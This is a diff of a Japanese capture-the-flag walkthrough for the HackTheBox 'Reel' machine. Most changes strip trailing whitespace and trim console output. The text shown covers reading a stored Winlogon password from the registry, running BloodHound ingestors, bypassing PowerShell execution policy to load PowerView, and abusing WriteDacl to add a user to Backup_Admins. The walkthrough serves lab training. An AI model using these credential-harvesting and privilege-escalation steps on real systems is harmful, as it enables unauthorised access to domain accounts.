@@ -185,28 +185,24 @@ SSHがターゲット上で動いていたことを思い出しTomのシェル�
 ```
 tom@REEL C:\Users\tom >reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon                                                        
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
     ...
-    DefaultUserName    REG_SZ    nico                                                                                           
-    DisableLockWorkstation    REG_DWORD    0x0                                                                                  
+    DefaultUserName    REG_SZ    nico                
+    DisableLockWorkstation    REG_DWORD    0x0      
     DefaultPassword    REG_SZ    4dri@na2017!**
 ```
 
 # Claire's shell
 
 ```
-tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir /a                                                              
- Volume in drive C has no label.                                                                                                
- Volume Serial Number is CC8A-33E1                                                                                              
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir /a
 
- Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                                                                
-
-05/29/2018  07:57 PM    <DIR>          .                                                                                        
-05/29/2018  07:57 PM    <DIR>          ..                                                                                       
-11/16/2017  11:50 PM           112,225 acls.csv                                                                                 
-10/28/2017  08:50 PM             3,549 BloodHound.bin                                                                           
-10/24/2017  03:27 PM           246,489 BloodHound_Old.ps1                                                                       
-10/24/2017  03:27 PM           568,832 SharpHound.exe                                                                           
+05/29/2018  07:57 PM    <DIR>          .  
+05/29/2018  07:57 PM    <DIR>          ..  
+11/16/2017  11:50 PM           112,225 acls.csv 
+10/28/2017  08:50 PM             3,549 BloodHound.bin   
+10/24/2017  03:27 PM           246,489 BloodHound_Old.ps1
+10/24/2017  03:27 PM           568,832 SharpHound.exe
 10/24/2017  03:27 PM           636,959 SharpHound.ps1
 ```
 
@@ -246,24 +242,18 @@ claireのオーナーをtomにすれば、tomはclaireのパスワードを設�
 
 PowerView.ps1を使うが、次のようにExecutinPolicyを設定してPowerShellを起動する必要がある：
 ```
-tom@REEL C:\Users\tom>powershell                                                                                                
-Windows PowerShell                                                                                                              
-Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
+tom@REEL C:\Users\tom>powershell
+PS C:\Users\tom> . .\PowerView.ps1
+. : File C:\Users\tom\PowerView.ps1 cannot be loaded because its operation is blocked by software restriction policies, such
+as those created by using Group Policy.
+At line:1 char:3
++ . .\PowerView.ps1
++   ~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+PS C:\Users\tom> exit
 
-PS C:\Users\tom> . .\PowerView.ps1                                                                                              
-. : File C:\Users\tom\PowerView.ps1 cannot be loaded because its operation is blocked by software restriction policies, such    
-as those created by using Group Policy.                                                                                         
-At line:1 char:3                                                                                                                
-+ . .\PowerView.ps1                                                                                                             
-+   ~~~~~~~~~~~~~~~                                                                                                             
-    + CategoryInfo          : SecurityError: (:) [], PSSecurityException                                                        
-    + FullyQualifiedErrorId : UnauthorizedAccess                                                                                
-PS C:\Users\tom> exit                                                                                                           
-
-tom@REEL C:\Users\tom>powershell -ExecutionPolicy Bypass                                                                        
-Windows PowerShell                                                                                                              
-Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  
-
+tom@REEL C:\Users\tom>powershell -ExecutionPolicy Bypass
 PS C:\Users\tom> . .\PowerView.ps1
 ```
 
@@ -300,7 +290,7 @@ claireはBackup_Adminsというグループに対してWriteDaclの権限をも�
 そこで、次のようにclaireをBackupAdminsグループに追加する：
 
 ```
-PS C:\Users\claire> net group "Backup_Admins" claire /add                                                                       
+PS C:\Users\claire> net group "Backup_Admins" claire /add
 The command completed successfully.
 ```
 
@@ -311,11 +301,7 @@ The command completed successfully.
 └─$ ssh claire@10.10.10.77
 ...
 claire@REEL C:\Users\claire> cd C:\Users\Administrator\Desktop
-claire@REEL C:\Users\Administrator\Desktop>dir /a                                                         
- Volume in drive C has no label.                                                                          
- Volume Serial Number is CC8A-33E1                                                                        
-
- Directory of C:\Users\Administrator\Desktop
+claire@REEL C:\Users\Administrator\Desktop>dir /a
 
 01/21/2018  02:56 PM    <DIR>          . 
 01/21/2018  02:56 PM    <DIR>          ..
